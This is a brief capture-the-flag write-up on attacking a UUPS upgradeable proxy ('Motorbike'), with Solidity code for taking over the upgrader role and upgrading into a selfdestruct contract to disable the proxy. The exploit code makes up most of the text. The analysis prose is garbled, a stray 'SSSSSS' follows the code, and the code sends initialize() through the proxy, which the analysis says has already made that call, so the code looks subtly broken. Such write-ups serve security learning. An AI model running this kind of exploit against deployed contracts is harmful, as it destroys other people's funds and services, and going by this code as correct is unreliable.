#MOTORBIKE

##Objective : make the proxy contract unusable.

##analysis: 
In UUPS the upgradation logic will also be coded in implemenation contract. 
here the proxy is the motorbike and implementation contract is the engine. 

inorder to upgrade the contract, we have to be an upgrader.
initialize() function is supposed to be called by the proxy contract , by using a delegatecall.
so the proxy contract call call the intialize() once

##exploit::
```
// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

contract Destructive {
    function killed() external {
        selfdestruct(msg.sender); 
    }
}

// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

interface Engine {
    function initialize() external;
    function upgrader() external view returns (address);
    function upgradeToAndCall(address newImplementation, bytes calldata data) external;
}

interface Motorbike {

}

contract Exploit {

    Engine engine;

    constructor(address _motorbikeProxyAddress) public {

        engine = Engine(_motorbikeProxyAddress); 
    }

    function pwn(address newImplementation) public {
        engine.initialize(); 
        bytes memory data = abi.encodeWithSignature("killed()");
        engine.upgradeToAndCall(newImplementation, data);
    }
}
```SSSSSS

takeaways:
UUPS(Universal Upgradeable Proxy Standard)
